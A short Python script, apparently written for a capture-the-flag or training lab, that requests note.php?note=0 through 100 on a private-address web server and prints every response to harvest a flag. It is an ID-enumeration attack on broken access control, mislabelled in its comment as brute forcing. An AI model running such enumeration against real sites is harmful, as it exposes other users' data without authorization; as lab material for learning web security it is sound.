#!/usr/bin/env python3
#owasp-top-10 broken authentication brute force flag script -_- , yeah im lazy
#D3DSEC

import requests
import time




url = 'http://10.10.41.114/note.php?note=' #change this


for i in range(101):
	r_url=url+str(i)
	print(r_url)
	r = requests.get(url=r_url)
	print(r.text)